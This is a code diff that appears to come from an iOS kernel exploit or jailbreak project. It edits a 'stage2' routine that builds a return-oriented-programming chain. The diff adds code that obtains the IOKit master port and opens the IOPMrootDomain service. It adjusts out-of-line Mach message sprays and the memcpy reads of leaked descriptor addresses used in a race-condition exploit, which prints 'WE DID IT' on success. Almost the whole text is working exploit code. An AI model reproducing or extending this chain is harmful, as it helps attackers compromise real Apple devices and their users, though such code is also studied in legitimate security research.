@@ -8,6 +8,7 @@
 #include <dlfcn.h>
 
 #include <shared/iokit.h>
+#include <shared/realsym.h>
 
 typedef struct {
 	mach_msg_header_t head;
@@ -49,7 +50,6 @@ union {
     MEMLEAK_Request In;
     MEMLEAK_Reply Out;
 } MEMLEAK_msg;
-
 
 typedef volatile struct {
     uint32_t ip_bits;
@@ -770,8 +770,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf(dylib_str,100,"FIXME");
 	DEFINE_ROP_VAR("dylib_str",strlen(dylib_str)+1,dylib_str);
 
-	char * wedidit_msg = malloc(100);
-	snprintf(wedidit_msg,100,"WE DID IT\n");
+	char * wedidit_msg = malloc(1024);
+	snprintf(wedidit_msg,1024,"WE DID IT\n");
 	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);
 
 	ADD_COMMENT("mach_task_self");
@@ -786,6 +786,36 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("mysigmask",2);
 	CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
+
+
+	DEFINE_ROP_VAR("mach_host",sizeof(mach_port_t),tmp);
+	CALL_FUNC_RET_SAVE_VAR("mach_host",get_addr_from_name(offsets,"mach_host_self"),0,0,0,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("master_port",sizeof(mach_port_t),tmp);
+	ROP_VAR_ARG_HOW_MANY(2);
+	ROP_VAR_ARG64("mach_host",1);
+	ROP_VAR_ARG("master_port",2);
+	CALL("host_get_io_master",0,0,0,0,0,0,0,0);
+
+	CFMutableDictionaryRef myservice_dict = IOServiceMatching("IOPMrootDomain");
+	CFDataRef myservice_serialized = IOCFSerialize(myservice_dict, kIOCFSerializeToBinary /*gIOKitLibSerializeOptions*/);
+	CFRelease(myservice_dict);
+	uint64_t data_length = CFDataGetLength(myservice_serialized);
+
+	DEFINE_ROP_VAR("my_service_data",data_length,CFDataGetBytePtr(myservice_serialized));
+
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG("master_port",1);
+	ROP_VAR_ARG("my_service_data",2);
+	ROP_VAR_ARG("service",4);
+	CALL_FUNC(realsym("/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64","_io_service_get_matching_service_bin"),0,0,data_length,0,0,0,0,0);
+
+	ROP_VAR_ARG_HOW_MANY(3);
+	ROP_VAR_ARG64("service",1);
+	ROP_VAR_ARG64("self",2);
+	ROP_VAR_ARG("client",4);
+	CALL("IOServiceOpen",0,0,0,0,0,0,0,0);
+
 
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer thread
@@ -840,12 +870,11 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_ARG64("msg_port",3);
 		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
 
-		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_remote_port) /*offset of head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));
+		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
 
-		ROP_VAR_ARG_HOW_MANY(2);
+		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("ool_msg",1);
-		ROP_VAR_ARG_W_OFFSET("ool_msg",3, offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_size) /*offset of head.msgh_size */);
-		CALL("mach_msg",0,MACH_SEND_MSG,0,0,0,0,0,0);
+		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);
 
 		// no need for another loop in rop... we can just unroll this one here
 		SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0); // set memleak_msg->Head.msgh_request_port
@@ -855,7 +884,7 @@ _STRUCT_ARM_THREAD_STATE64
 			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
 		}
 
-		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_local_port) /*offset of head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));
+		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head.msgh_local_port),"msg_port",0,sizeof(mach_port_t));
 
 		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("ool_msg_recv",1);
@@ -871,11 +900,11 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_ARG("desc_addr",1);
 		CALL("memcpy",0,0,8,0,0,0,0,0);
 
-		// copy the first 8 bytes at the descriptor address into the_one
+		// copy the first 4 bytes at the descriptor address into the_one
 		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("the_one",1);
 		ROP_VAR_ARG64("desc_addr",2);
-		CALL("memcpy",0,0,8,0,0,0,0,0);
+		CALL("memcpy",0,0,4,0,0,0,0,0);
 
 		// set x0 to the_one
 		SET_X0_FROM_ROP_VAR("the_one");
@@ -888,7 +917,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
-	CALL("write",1,0,strlen(wedidit_msg),0,0,0,0,0);
+	CALL("write",1,0,1024,0,0,0,0,0);
 
 	ADD_USLEEP(10000000);
 
@@ -1139,7 +1168,11 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
 		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
-
+		/*
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG("test_string",2);
+		CALL("write",1,0,1024,0,0,0,0,0);
+		*/
 		for (int i = 0; i < NENT; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG64_W_OFFSET("aio_list",1,i*8);
